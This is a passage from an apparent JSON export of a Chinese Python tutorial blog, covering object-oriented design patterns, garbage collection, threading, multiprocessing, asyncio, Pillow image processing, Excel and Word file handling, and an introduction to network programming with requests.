__init__(self, name): self.name = name @abstractmethod def get_salary(self): \"\"\"结算月薪(抽象方法)\"\"\" pass class Manager(Employee): \"\"\"部门经理\"\"\" def get_salary(self): return 15000.0 class Programmer(Employee): \"\"\"程序员\"\"\" def __init__(self, name, working_hour=0): self.working_hour = working_hour super().__init__(name) def get_salary(self): return 200.0 * self.working_hour class Salesman(Employee): \"\"\"销售员\"\"\" def __init__(self, name, sales=0.0): self.sales = sales super().__init__(name) def get_salary(self): return 1800.0 + self.sales * 0.05 class EmployeeFactory: \"\"\"创建员工的工厂（工厂模式 - 通过工厂实现对象使用者和对象之间的解耦合）\"\"\" @staticmethod def create(emp_type, *args, **kwargs): \"\"\"创建员工\"\"\" all_emp_types = {'M': Manager, 'P': Programmer, 'S': Salesman} cls = all_emp_types[emp_type.upper()] return cls(*args, **kwargs) if cls else None def main(): \"\"\"主函数\"\"\" emps = [ EmployeeFactory.create('M', '曹操'), EmployeeFactory.create('P', '荀彧', 120), EmployeeFactory.create('P', '郭嘉', 85), EmployeeFactory.create('S', '典韦', 123000), ] for emp in emps: print(f'{emp.name}: {emp.get_salary():.2f}元') if __name__ == '__main__': main() 类与类之间的关系 is-a关系：继承 has-a关系：关联 / 聚合 / 合成 use-a关系：依赖 例子：扑克游戏。 \"\"\" 经验：符号常量总是优于字面常量，枚举类型是定义符号常量的最佳选择 \"\"\" from enum import Enum, unique import random @unique class Suite(Enum): \"\"\"花色\"\"\" SPADE, HEART, CLUB, DIAMOND = range(4) def __lt__(self, other): return self.value &lt; other.value class Card(): \"\"\"牌\"\"\" def __init__(self, suite, face): \"\"\"初始化方法\"\"\" self.suite = suite self.face = face def show(self): \"\"\"显示牌面\"\"\" suites = ['♠︎', '♥︎', '♣︎', '♦︎'] faces = ['', 'A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'] return f'{suites[self.suite.value]}{faces[self.face]}' def __repr__(self): return self.show() class Poker(): \"\"\"扑克\"\"\" def __init__(self): self.index = 0 self.cards = [Card(suite, face) for suite in Suite for face in range(1, 14)] def shuffle(self): \"\"\"洗牌（随机乱序）\"\"\" random.shuffle(self.cards) self.index = 0 def deal(self): \"\"\"发牌\"\"\" card = self.cards[self.index] self.index += 1 return card @property def has_more(self): return self.index &lt; len(self.cards) class Player(): \"\"\"玩家\"\"\" def __init__(self, name): self.name = name self.cards = [] def get_one(self, card): \"\"\"摸一张牌\"\"\" self.cards.append(card) def sort(self, comp=lambda card: (card.suite, card.face)): \"\"\"整理手上的牌\"\"\" self.cards.sort(key=comp) def main(): \"\"\"主函数\"\"\" poker = Poker() poker.shuffle() players = [Player('东邪'), Player('西毒'), Player('南帝'), Player('北丐')] while poker.has_more: for player in players: player.get_one(poker.deal()) for player in players: player.sort() print(player.name, end=': ') print(player.cards) if __name__ == '__main__': main() 说明：上面的代码中使用了Emoji字符来表示扑克牌的四种花色，在某些不支持Emoji字符的系统上可能无法显示。 对象的复制（深复制/深拷贝/深度克隆和浅复制/浅拷贝/影子克隆） 垃圾回收、循环引用和弱引用 Python使用了自动化内存管理，这种管理机制以引用计数为基础，同时也引入了标记-清除和分代收集两种机制为辅的策略。 typedef struct _object { /* 引用计数 */ int ob_refcnt; /* 对象指针 */ struct _typeobject *ob_type; } PyObject; /* 增加引用计数的宏定义 */ #define Py_INCREF(op) ((op)-&gt;ob_refcnt++) /* 减少引用计数的宏定义 */ #define Py_DECREF(op) \\ //减少计数 if (--(op)-&gt;ob_refcnt != 0) \\ ; \\ else \\ __Py_Dealloc((PyObject *)(op)) 导致引用计数+1的情况： 对象被创建，例如a = 23 对象被引用，例如b = a 对象被作为参数，传入到一个函数中，例如f(a) 对象作为一个元素，存储在容器中，例如list1 = [a, a] 导致引用计数-1的情况： 对象的别名被显式销毁，例如del a 对象的别名被赋予新的对象，例如a = 24 一个对象离开它的作用域，例如f函数执行完毕时，f函数中的局部变量（全局变量不会） 对象所在的容器被销毁，或从容器中删除对象 引用计数可能会导致循环引用问题，而循环引用会导致内存泄露，如下面的代码所示。为了解决这个问题，Python中引入了“标记-清除”和“分代收集”。在创建一个对象的时候，对象被放在第一代中，如果在第一代的垃圾检查中对象存活了下来，该对象就会被放到第二代中，同理在第二代的垃圾检查中对象存活下来，该对象就会被放到第三代中。 # 循环引用会导致内存泄露 - Python除了引用技术还引入了标记清理和分代回收 # 在Python 3.6以前如果重写__del__魔术方法会导致循环引用处理失效 # 如果不想造成循环引用可以使用弱引用 list1 = [] list2 = [] list1.append(list2) list2.append(list1) 以下情况会导致垃圾回收： 调用gc.collect() gc模块的计数器达到阀值 程序退出 如果循环引用中两个对象都定义了__del__方法，gc模块不会销毁这些不可达对象，因为gc模块不知道应该先调用哪个对象的__del__方法，这个问题在Python 3.6中得到了解决。 也可以通过weakref模块构造弱引用的方式来解决循环引用的问题。 魔法属性和方法（请参考《Python魔法方法指南》） 有几个小问题请大家思考： 自定义的对象能不能使用运算符做运算？ 自定义的对象能不能放到set中？能去重吗？ 自定义的对象能不能作为dict的键？ 自定义的对象能不能使用上下文语法？ 混入（Mixin） 例子：自定义字典限制只有在指定的key不存在时才能在字典中设置键值对。 class SetOnceMappingMixin: \"\"\"自定义混入类\"\"\" __slots__ = () def __setitem__(self, key, value): if key in self: raise KeyError(str(key) + ' already set') return super().__setitem__(key, value) class SetOnceDict(SetOnceMappingMixin, dict): \"\"\"自定义字典\"\"\" pass my_dict= SetOnceDict() try: my_dict['username'] = 'jackfrued' my_dict['username'] = 'hellokitty' except KeyError: pass print(my_dict) 元编程和元类 对象是通过类创建的，类是通过元类创建的，元类提供了创建类的元信息。所有的类都直接或间接的继承自object，所有的元类都直接或间接的继承自type。 例子：用元类实现单例模式。 import threading class SingletonMeta(type): \"\"\"自定义元类\"\"\" def __init__(cls, *args, **kwargs): cls.__instance = None cls.__lock = threading.RLock() super().__init__(*args, **kwargs) def __call__(cls, *args, **kwargs): if cls.__instance is None: with cls.__lock: if cls.__instance is None: cls.__instance = super().__call__(*args, **kwargs) return cls.__instance class President(metaclass=SingletonMeta): \"\"\"总统(单例类)\"\"\" pass 面向对象设计原则 单一职责原则 （SRP）- 一个类只做该做的事情（类的设计要高内聚） 开闭原则 （OCP）- 软件实体应该对扩展开发对修改关闭 依赖倒转原则（DIP）- 面向抽象编程（在弱类型语言中已经被弱化） 里氏替换原则（LSP） - 任何时候可以用子类对象替换掉父类对象 接口隔离原则（ISP）- 接口要小而专不要大而全（Python中没有接口的概念） 合成聚合复用原则（CARP） - 优先使用强关联关系而不是继承关系复用代码 最少知识原则（迪米特法则，LoD）- 不要给没有必然联系的对象发消息 说明：上面加粗的字母放在一起称为面向对象的SOLID原则。 GoF设计模式 创建型模式：单例、工厂、建造者、原型 结构型模式：适配器、门面（外观）、代理 行为型模式：迭代器、观察者、状态、策略 例子：可插拔的哈希算法（策略模式）。 class StreamHasher(): \"\"\"哈希摘要生成器\"\"\" def __init__(self, alg='md5', size=4096): self.size = size alg = alg.lower() self.hasher = getattr(__import__('hashlib'), alg.lower())() def __call__(self, stream): return self.to_digest(stream) def to_digest(self, stream): \"\"\"生成十六进制形式的摘要\"\"\" for buf in iter(lambda: stream.read(self.size), b''): self.hasher.update(buf) return self.hasher.hexdigest() def main(): \"\"\"主函数\"\"\" hasher1 = StreamHasher() with open('Python-3.7.6.tgz', 'rb') as stream: print(hasher1.to_digest(stream)) hasher2 = StreamHasher('sha1') with open('Python-3.7.6.tgz', 'rb') as stream: print(hasher2(stream)) if __name__ == '__main__': main() 迭代器和生成器 迭代器是实现了迭代器协议的对象。 Python中没有像protocol或interface这样的定义协议的关键字。 Python中用魔术方法表示协议。 __iter__和__next__魔术方法就是迭代器协议。 class Fib(object): \"\"\"迭代器\"\"\" def __init__(self, num): self.num = num self.a, self.b = 0, 1 self.idx = 0 def __iter__(self): return self def __next__(self): if self.idx &lt; self.num: self.a, self.b = self.b, self.a + self.b self.idx += 1 return self.a raise StopIteration() 生成器是语法简化版的迭代器。 def fib(num): \"\"\"生成器\"\"\" a, b = 0, 1 for _ in range(num): a, b = b, a + b yield a 生成器进化为协程。 生成器对象可以使用send()方法发送数据，发送的数据会成为生成器函数中通过yield表达式获得的值。这样，生成器就可以作为协程使用，协程简单的说就是可以相互协作的子程序。 def calc_avg(): \"\"\"流式计算平均值\"\"\" total, counter = 0, 0 avg_value = None while True: value = yield avg_value total, counter = total + value, counter + 1 avg_value = total / counter gen = calc_avg() next(gen) print(gen.send(10)) print(gen.send(20)) print(gen.send(30)) 并发编程Python中实现并发编程的三种方案：多线程、多进程和异步I/O。并发编程的好处在于可以提升程序的执行效率以及改善用户体验；坏处在于并发的程序不容易开发和调试，同时对其他程序来说它并不友好。 多线程：Python中提供了Thread类并辅以Lock、Condition、Event、Semaphore和Barrier。Python中有GIL来防止多个线程同时执行本地字节码，这个锁对于CPython是必须的，因为CPython的内存管理并不是线程安全的，因为GIL的存在多线程并不能发挥CPU的多核特性。 \"\"\" 面试题：进程和线程的区别和联系？ 进程 - 操作系统分配内存的基本单位 - 一个进程可以包含一个或多个线程 线程 - 操作系统分配CPU的基本单位 并发编程（concurrent programming） 1. 提升执行性能 - 让程序中没有因果关系的部分可以并发的执行 2. 改善用户体验 - 让耗时间的操作不会造成程序的假死 \"\"\" import glob import os import threading from PIL import Image PREFIX = 'thumbnails' def generate_thumbnail(infile, size, format='PNG'): \"\"\"生成指定图片文件的缩略图\"\"\" file, ext = os.path.splitext(infile) file = file[file.rfind('/') + 1:] outfile = f'{PREFIX}/{file}_{size[0]}_{size[1]}.{ext}' img = Image.open(infile) img.thumbnail(size, Image.ANTIALIAS) img.save(outfile, format) def main(): \"\"\"主函数\"\"\" if not os.path.exists(PREFIX): os.mkdir(PREFIX) for infile in glob.glob('images/*.png'): for size in (32, 64, 128): # 创建并启动线程 threading.Thread( target=generate_thumbnail, args=(infile, (size, size)) ).start() if __name__ == '__main__': main() 多个线程竞争资源的情况。 \"\"\" 多线程程序如果没有竞争资源处理起来通常也比较简单 当多个线程竞争临界资源的时候如果缺乏必要的保护措施就会导致数据错乱 说明：临界资源就是被多个线程竞争的资源 \"\"\" import time import threading from concurrent.futures import ThreadPoolExecutor class Account(object): \"\"\"银行账户\"\"\" def __init__(self): self.balance = 0.0 self.lock = threading.Lock() def deposit(self, money): # 通过锁保护临界资源 with self.lock: new_balance = self.balance + money time.sleep(0.001) self.balance = new_balance class AddMoneyThread(threading.Thread): \"\"\"自定义线程类\"\"\" def __init__(self, account, money): self.account = account self.money = money # 自定义线程的初始化方法中必须调用父类的初始化方法 super().__init__() def run(self): # 线程启动之后要执行的操作 self.account.deposit(self.money) def main(): \"\"\"主函数\"\"\" account = Account() # 创建线程池 pool = ThreadPoolExecutor(max_workers=10) futures = [] for _ in range(100): # 创建线程的第1种方式 # threading.Thread( # target=account.deposit, args=(1, ) # ).start() # 创建线程的第2种方式 # AddMoneyThread(account, 1).start() # 创建线程的第3种方式 # 调用线程池中的线程来执行特定的任务 future = pool.submit(account.deposit, 1) futures.append(future) # 关闭线程池 pool.shutdown() for future in futures: future.result() print(account.balance) if __name__ == '__main__': main() 修改上面的程序，启动5个线程向账户中存钱，5个线程从账户中取钱，取钱时如果余额不足就暂停线程进行等待。为了达到上述目标，需要对存钱和取钱的线程进行调度，在余额不足时取钱的线程暂停并释放锁，而存钱的线程将钱存入后要通知取钱的线程，使其从暂停状态被唤醒。可以使用threading模块的Condition来实现线程调度，该对象也是基于锁来创建的，代码如下所示： \"\"\" 多个线程竞争一个资源 - 保护临界资源 - 锁（Lock/RLock） 多个线程竞争多个资源（线程数&gt;资源数） - 信号量（Semaphore） 多个线程的调度 - 暂停线程执行/唤醒等待中的线程 - Condition \"\"\" from concurrent.futures import ThreadPoolExecutor from random import randint from time import sleep import threading class Account: \"\"\"银行账户\"\"\" def __init__(self, balance=0): self.balance = balance lock = threading.RLock() self.condition = threading.Condition(lock) def withdraw(self, money): \"\"\"取钱\"\"\" with self.condition: while money &gt; self.balance: self.condition.wait() new_balance = self.balance - money sleep(0.001) self.balance = new_balance def deposit(self, money): \"\"\"存钱\"\"\" with self.condition: new_balance = self.balance + money sleep(0.001) self.balance = new_balance self.condition.notify_all() def add_money(account): while True: money = randint(5, 10) account.deposit(money) print(threading.current_thread().name, ':', money, '====&gt;', account.balance) sleep(0.5) def sub_money(account): while True: money = randint(10, 30) account.withdraw(money) print(threading.current_thread().name, ':', money, '&lt;====', account.balance) sleep(1) def main(): account = Account() with ThreadPoolExecutor(max_workers=15) as pool: for _ in range(5): pool.submit(add_money, account) for _ in range(10): pool.submit(sub_money, account) if __name__ == '__main__': main() 多进程：多进程可以有效的解决GIL的问题，实现多进程主要的类是Process，其他辅助的类跟threading模块中的类似，进程间共享数据可以使用管道、套接字等，在multiprocessing模块中有一个Queue类，它基于管道和锁机制提供了多个进程共享的队列。下面是官方文档上关于多进程和进程池的一个示例。 \"\"\" 多进程和进程池的使用 多线程因为GIL的存在不能够发挥CPU的多核特性 对于计算密集型任务应该考虑使用多进程 time python3 example22.py real 0m11.512s user 0m39.319s sys 0m0.169s 使用多进程后实际执行时间为11.512秒，而用户时间39.319秒约为实际执行时间的4倍 这就证明我们的程序通过多进程使用了CPU的多核特性，而且这台计算机配置了4核的CPU \"\"\" import concurrent.futures import math PRIMES = [ 1116281, 1297337, 104395303, 472882027, 533000389, 817504243, 982451653, 112272535095293, 112582705942171, 112272535095293, 115280095190773, 115797848077099, 1099726899285419 ] * 5 def is_prime(n): \"\"\"判断素数\"\"\" if n % 2 == 0: return False sqrt_n = int(math.floor(math.sqrt(n))) for i in range(3, sqrt_n + 1, 2): if n % i == 0: return False return True def main(): \"\"\"主函数\"\"\" with concurrent.futures.ProcessPoolExecutor() as executor: for number, prime in zip(PRIMES, executor.map(is_prime, PRIMES)): print('%d is prime: %s' % (number, prime)) if __name__ == '__main__': main() 重点：多线程和多进程的比较。 以下情况需要使用多线程： 程序需要维护许多共享的状态（尤其是可变状态），Python中的列表、字典、集合都是线程安全的，所以使用线程而不是进程维护共享状态的代价相对较小。 程序会花费大量时间在I/O操作上，没有太多并行计算的需求且不需占用太多的内存。 以下情况需要使用多进程： 程序执行计算密集型任务（如：字节码操作、数据处理、科学计算）。 程序的输入可以并行的分成块，并且可以将运算结果合并。 程序在内存使用方面没有任何限制且不强依赖于I/O操作（如：读写文件、套接字等）。 异步处理：从调度程序的任务队列中挑选任务，该调度程序以交叉的形式执行这些任务，我们并不能保证任务将以某种顺序去执行，因为执行顺序取决于队列中的一项任务是否愿意将CPU处理时间让位给另一项任务。异步任务通常通过多任务协作处理的方式来实现，由于执行时间和顺序的不确定，因此需要通过回调式编程或者future对象来获取任务执行的结果。Python 3通过asyncio模块和await和async关键字（在Python 3.7中正式被列为关键字）来支持异步处理。 \"\"\" 异步I/O - async / await \"\"\" import asyncio def num_generator(m, n): \"\"\"指定范围的数字生成器\"\"\" yield from range(m, n + 1) async def prime_filter(m, n): \"\"\"素数过滤器\"\"\" primes = [] for i in num_generator(m, n): flag = True for j in range(2, int(i ** 0.5 + 1)): if i % j == 0: flag = False break if flag: print('Prime =&gt;', i) primes.append(i) await asyncio.sleep(0.001) return tuple(primes) async def square_mapper(m, n): \"\"\"平方映射器\"\"\" squares = [] for i in num_generator(m, n): print('Square =&gt;', i * i) squares.append(i * i) await asyncio.sleep(0.001) return squares def main(): \"\"\"主函数\"\"\" loop = asyncio.get_event_loop() future = asyncio.gather(prime_filter(2, 100), square_mapper(1, 100)) future.add_done_callback(lambda x: print(x.result())) loop.run_until_complete(future) loop.close() if __name__ == '__main__': main() 说明：上面的代码使用get_event_loop函数获得系统默认的事件循环，通过gather函数可以获得一个future对象，future对象的add_done_callback可以添加执行完成时的回调函数，loop对象的run_until_complete方法可以等待通过future对象获得协程执行结果。 Python中有一个名为aiohttp的三方库，它提供了异步的HTTP客户端和服务器，这个三方库可以跟asyncio模块一起工作，并提供了对Future对象的支持。Python 3.6中引入了async和await来定义异步执行的函数以及创建异步上下文，在Python 3.7中它们正式成为了关键字。下面的代码异步的从5个URL中获取页面并通过正则表达式的命名捕获组提取了网站的标题。 import asyncio import re import aiohttp PATTERN = re.compile(r'\\&lt;title\\&gt;(?P&lt;title&gt;.*)\\&lt;\\/title\\&gt;') async def fetch_page(session, url): async with session.get(url, ssl=False) as resp: return await resp.text() async def show_title(url): async with aiohttp.ClientSession() as session: html = await fetch_page(session, url) print(PATTERN.search(html).group('title')) def main(): urls = ('https://www.python.org/', 'https://git-scm.com/', 'https://www.jd.com/', 'https://www.taobao.com/', 'https://www.douban.com/') loop = asyncio.get_event_loop() cos = [show_title(url) for url in urls] loop.run_until_complete(asyncio.wait(cos)) loop.close() if __name__ == '__main__': main() 重点：异步I/O与多进程的比较。 当程序不需要真正的并发性或并行性，而是更多的依赖于异步处理和回调时，asyncio就是一种很好的选择。如果程序中有大量的等待与休眠时，也应该考虑asyncio，它很适合编写没有实时数据处理需求的Web应用服务器。 Python还有很多用于处理并行任务的三方库，例如：joblib、PyMP等。实际开发中，要提升系统的可扩展性和并发性通常有垂直扩展（增加单个节点的处理能力）和水平扩展（将单个节点变成多个节点）两种做法。可以通过消息队列来实现应用程序的解耦合，消息队列相当于是多线程同步队列的扩展版本，不同机器上的应用程序相当于就是线程，而共享的分布式消息队列就是原来程序中的Queue。消息队列（面向消息的中间件）的最流行和最标准化的实现是AMQP（高级消息队列协议），AMQP源于金融行业，提供了排队、路由、可靠传输、安全等功能，最著名的实现包括：Apache的ActiveMQ、RabbitMQ等。 要实现任务的异步化，可以使用名为Celery的三方库。Celery是Python编写的分布式任务队列，它使用分布式消息进行工作，可以基于RabbitMQ或Redis来作为后端的消息代理。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"15图像和办公文档处理","slug":"15图像和办公文档处理","date":"2021-05-18T01:18:48.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/9f72279.html","link":"","permalink":"http://www.xiaocaibi.top/posts/9f72279.html","excerpt":"","text":"图像和办公文档处理用程序来处理图像和办公文档经常出现在实际开发中，Python的标准库中虽然没有直接支持这些操作的模块，但我们可以通过Python生态圈中的第三方模块来完成这些操作。 操作图像计算机图像相关知识 颜色。如果你有使用颜料画画的经历，那么一定知道混合红、黄、蓝三种颜料可以得到其他的颜色，事实上这三种颜色就是被我们称为美术三原色的东西，它们是不能再分解的基本颜色。在计算机中，我们可以将红、绿、蓝三种色光以不同的比例叠加来组合成其他的颜色，因此这三种颜色就是色光三原色，所以我们通常会将一个颜色表示为一个RGB值或RGBA值（其中的A表示Alpha通道，它决定了透过这个图像的像素，也就是透明度）。 名称 RGBA值 名称 RGBA值 White (255, 255, 255, 255) Red (255, 0, 0, 255) Green (0, 255, 0, 255) Blue (0, 0, 255, 255) Gray (128, 128, 128, 255) Yellow (255, 255, 0, 255) Black (0, 0, 0, 255) Purple (128, 0, 128, 255) 像素。对于一个由数字序列表示的图像来说，最小的单位就是图像上单一颜色的小方格，这些小方块都有一个明确的位置和被分配的色彩数值，而这些一小方格的颜色和位置决定了该图像最终呈现出来的样子，它们是不可分割的单位，我们通常称之为像素（pixel）。每一个图像都包含了一定量的像素，这些像素决定图像在屏幕上所呈现的大小。 用Pillow操作图像Pillow是由从著名的Python图像处理库PIL发展出来的一个分支，通过Pillow可以实现图像压缩和图像处理等各种操作。可以使用下面的命令来安装Pillow。 pip install pillow Pillow中最为重要的是Image类，读取和处理图像都要通过这个类来完成。 &gt;&gt;&gt; from PIL import Image &gt;&gt;&gt; &gt;&gt;&gt; image = Image.open('./res/guido.jpg') &gt;&gt;&gt; image.format, image.size, image.mode ('JPEG', (500, 750), 'RGB') &gt;&gt;&gt; image.show() 剪裁图像 &gt;&gt;&gt; image = Image.open('./res/guido.jpg') &gt;&gt;&gt; rect = 80, 20, 310, 360 &gt;&gt;&gt; image.crop(rect).show() 生成缩略图 &gt;&gt;&gt; image = Image.open('./res/guido.jpg') &gt;&gt;&gt; size = 128, 128 &gt;&gt;&gt; image.thumbnail(size) &gt;&gt;&gt; image.show() 缩放和黏贴图像 &gt;&gt;&gt; image1 = Image.open('./res/luohao.png') &gt;&gt;&gt; image2 = Image.open('./res/guido.jpg') &gt;&gt;&gt; rect = 80, 20, 310, 360 &gt;&gt;&gt; guido_head = image2.crop(rect) &gt;&gt;&gt; width, height = guido_head.size &gt;&gt;&gt; image1.paste(guido_head.resize((int(width / 1.5), int(height / 1.5))), (172, 40)) 旋转和翻转 &gt;&gt;&gt; image = Image.open('./res/guido.png') &gt;&gt;&gt; image.rotate(180).show() &gt;&gt;&gt; image.transpose(Image.FLIP_LEFT_RIGHT).show() 操作像素 &gt;&gt;&gt; image = Image.open('./res/guido.jpg') &gt;&gt;&gt; for x in range(80, 310): ... for y in range(20, 360): ... image.putpixel((x, y), (128, 128, 128)) ... &gt;&gt;&gt; image.show() 滤镜效果 &gt;&gt;&gt; from PIL import Image, ImageFilter &gt;&gt;&gt; &gt;&gt;&gt; image = Image.open('./res/guido.jpg') &gt;&gt;&gt; image.filter(ImageFilter.CONTOUR).show() 处理Excel电子表格Python的openpyxl模块让我们可以在Python程序中读取和修改Excel电子表格，由于微软从Office 2007开始使用了新的文件格式，这使得Office Excel和LibreOffice Calc、OpenOffice Calc是完全兼容的，这就意味着openpyxl模块也能处理来自这些软件生成的电子表格。 import datetime from openpyxl import Workbook wb = Workbook() ws = wb.active ws['A1'] = 42 ws.append([1, 2, 3]) ws['A2'] = datetime.datetime.now() wb.save(\"sample.xlsx\") 处理Word文档利用python-docx模块，Python可以创建和修改Word文档，当然这里的Word文档不仅仅是指通过微软的Office软件创建的扩展名为docx的文档，LibreOffice Writer和OpenOffice Writer都是免费的字处理软件。 from docx import Document from docx.shared import Inches document = Document() document.add_heading('Document Title', 0) p = document.add_paragraph('A plain paragraph having some ') p.add_run('bold').bold = True p.add_run(' and some ') p.add_run('italic.').italic = True document.add_heading('Heading, level 1', level=1) document.add_paragraph('Intense quote', style='Intense Quote') document.add_paragraph( 'first item in unordered list', style='List Bullet' ) document.add_paragraph( 'first item in ordered list', style='List Number' ) document.add_picture('monty-truth.png', width=Inches(1.25)) records = ( (3, '101', 'Spam'), (7, '422', 'Eggs'), (4, '631', 'Spam, spam, eggs, and spam') ) table = document.add_table(rows=1, cols=3) hdr_cells = table.rows[0].cells hdr_cells[0].text = 'Qty' hdr_cells[1].text = 'Id' hdr_cells[2].text = 'Desc' for qty, id, desc in records: row_cells = table.add_row().cells row_cells[0].text = str(qty) row_cells[1].text = id row_cells[2].text = desc document.add_page_break() document.save('demo.docx')","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"14网络编程入门和网络应用开发","slug":"14网络编程入门和网络应用开发","date":"2021-05-17T01:18:12.000Z","updated":"2021-09-20T08:47:43.900Z","comments":true,"path":"posts/1a9bd86f.html","link":"","permalink":"http://www.xiaocaibi.top/posts/1a9bd86f.html","excerpt":"","text":"网络编程入门计算机网络基础计算机网络是独立自主的计算机互联而成的系统的总称，组建计算机网络最主要的目的是实现多台计算机之间的通信和资源共享。今天计算机网络中的设备和计算机网络的用户已经多得不可计数，而计算机网络也可以称得上是一个“复杂巨系统”，对于这样的系统，我们不可能用一两篇文章把它讲清楚，有兴趣的读者可以自行阅读Andrew S.Tanenbaum老师的经典之作《计算机网络》或Kurose和Ross老师合著的《计算机网络:自顶向下方法》来了解计算机网络的相关知识。 计算机网络发展史 1960s - 美国国防部ARPANET项目问世，奠定了分组交换网络的基础。 1980s - 国际标准化组织（ISO）发布OSI/RM，奠定了网络技术标准化的基础。 1990s - 英国人蒂姆·伯纳斯-李发明了图形化的浏览器，浏览器的简单易用性使得计算机网络迅速被普及。 在没有浏览器的年代，上网是这样的。 有了浏览器以后，上网是这样的。 TCP/IP模型实现网络通信的基础是网络通信协议，这些协议通常是由互联网工程任务组 （IETF）制定的。所谓“协议”就是通信计算机双方必须共同遵从的一组约定，例如怎样建立连接、怎样互相识别等，网络协议的三要素是：语法、语义和时序。构成我们今天使用的Internet的基础的是TCP/IP协议族，所谓协议族就是一系列的协议及其构成的通信模型，我们通常也把这套东西称为TCP/IP模型。与国际标准化组织发布的OSI/RM这个七层模型不同，TCP/IP是一个四层模型，也就是说，该模型将我们使用的网络从逻辑上分解为四个层次，自底向上依次是：网络接口层、网络层、传输层和应用层，如下图所示。 IP通常被翻译为网际协议，它服务于网络层，主要实现了寻址和路由的功能。接入网络的每一台主机都需要有自己的IP地址，IP地址就是主机在计算机网络上的身份标识。当然由于IPv4地址的匮乏，我们平常在家里、办公室以及其他可以接入网络的公共区域上网时获得的IP地址并不是全球唯一的IP地址，而是一个局域网（LAN）中的内部IP地址，通过网络地址转换（NAT）服务我们也可以实现对网络的访问。计算机网络上有大量的被我们称为“路由器”的网络中继设备，它们会存储转发我们发送到网络上的数据分组，让从源头发出的数据最终能够找到传送到目的地通路，这项功能就是所谓的路由。 TCP全称传输控制协议，它是基于IP提供的寻址和路由服务而建立起来的负责实现端到端可靠传输的协议，之所以将TCP称为可靠的传输协议是因为TCP向调用者承诺了三件事情： 数据不传丢不传错（利用握手、校验和重传机制可以实现）。 流量控制（通过滑动窗口匹配数据发送者和接收者之间的传输速度）。 拥塞控制（通过RTT时间以及对滑动窗口的控制缓解网络拥堵）。 网络应用模式 C/S模式和B/S模式。这里的C指的是Client（客户端），通常是一个需要安装到某个宿主操作系统上的应用程序；而B指的是Browser（浏览器），它几乎是所有图形化操作系统都默认安装了的一个应用软件；通过C或B都可以实现对S（服务器）的访问。关于二者的比较和讨论在网络上有一大堆的文章，在此我们就不再浪费笔墨了。 去中心化的网络应用模式。不管是B/S还是C/S都需要服务器的存在，服务器就是整个应用模式的中心，而去中心化的网络应用通常没有固定的服务器或者固定的客户端，所有应用的使用者既可以作为资源的提供者也可以作为资源的访问者。 基于HTTP协议的网络资源访问HTTP（超文本传输协议）HTTP是超文本传输协议（Hyper-Text Transfer Proctol）的简称，维基百科上对HTTP的解释是：超文本传输协议是一种用于分布式、协作式和超媒体信息系统的应用层协议，它是万维网数据通信的基础，设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法，通过HTTP或者HTTPS（超文本传输安全协议）请求的资源由URI（统一资源标识符）来标识。关于HTTP的更多内容，我们推荐阅读阮一峰老师的《HTTP 协议入门》，简单的说，通过HTTP我们可以获取网络上的（基于字符的）资源，开发中经常会用到的网络API（有的地方也称之为网络数据接口）就是基于HTTP来实现数据传输的。 JSON格式JSON（JavaScript Object Notation）是一种轻量级的数据交换语言，该语言以易于让人阅读的文字（纯文本）为基础，用来传输由属性值或者序列性的值组成的数据对象。尽管JSON是最初只是Javascript中一种创建对象的字面量语法，但它在当下更是一种独立于语言的数据格式，很多编程语言都支持JSON格式数据的生成和解析，Python内置的json模块也提供了这方面的功能。由于JSON是纯文本，它和XML一样都适用于异构系统之间的数据交换，而相较于XML，JSON显得更加的轻便和优雅。下面是表达同样信息的XML和JSON，而JSON的优势是相当直观的。 XML的例子： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;message&gt; &lt;from&gt;Alice&lt;/from&gt; &lt;to&gt;Bob&lt;/to&gt; &lt;content&gt;Will you marry me?&lt;/content&gt; &lt;/message&gt; JSON的例子： { \"from\": \"Alice\", \"to\": \"Bob\", \"content\": \"Will you marry me?\" } requests库requests是一个基于HTTP协议来使用网络的第三库，其官方网站有这样的一句介绍它的话：“Requests是唯一的一个非转基因的Python HTTP库，人类可以安全享用。”简单的说，使用requests库可以非常方便的使用HTTP，避免安全缺陷、冗余代码以及“重复发明轮子”（行业黑话，通常用在软件工程领域表示重新创造一个已有的或是早已被优化過的基本方法）。前面的文章中我们已经使用过这个库，下面我们还是通过requests来实现一个访问网络数据接口并从中获取美女图片下载链接然后下载美女图片到本地的例子程序，程序中使用了天行数据提供的网络API。 我们可以先通过pip安装requests及其依赖库。 pip install requests 如果使用PyCharm作为开发工具，可以直接在代码中书写import requests，然后通过代码修复功能来自动下载安装requests。 from time import time from threading import Thread import requests # 继承Thread类创建自定义的线程类 class DownloadHanlder(Thread): def __init__(self, url): super().__init__() self.url = url def run(self): filename = self.url[self.url.rfind('/') + 1:] resp = requests.get(self.url) with open('/Users/Hao/' + filename, 'wb') as f: f.write(resp.content) def main(): # 通过requests模块的get函数获取网络资源 # 下面的代码中使用了天行数据接口提供的网络API # 要使用该数据接口需要在天行数据的网站上注册 # 然后用自己的Key替换掉下面代码的中APIKey即可 resp = requests.get( 'http://api.tianapi.com/meinv/?key=APIKey&amp;num=10') # 将服务器返回的JSON格式的数据解析为字典 data_model = resp.json() for mm_dict in data_model['newslist']: url = mm_dict['picUrl'] # 通过多线程的方式实现图片下载 DownloadHanlder(url).start() if __name__ == '__main__': main() 基于传输层协议的套接字编程套接字这个词对很多不了解网络编程的人来说显得非常晦涩和陌生，其实说得通俗点，套接字就是一套用C语言写成的应用程序开发库，主要用于实现进程间通信和网络编程，在网络应用开发中被广泛使用。在Python中也可以基于套接字来使用传输层提供的传输服务，并基于此开发自己的网络应用。实际开发中使用的套接字可以分为三类：流套接字（TCP套接字）、数据报套接字和原始套接字。 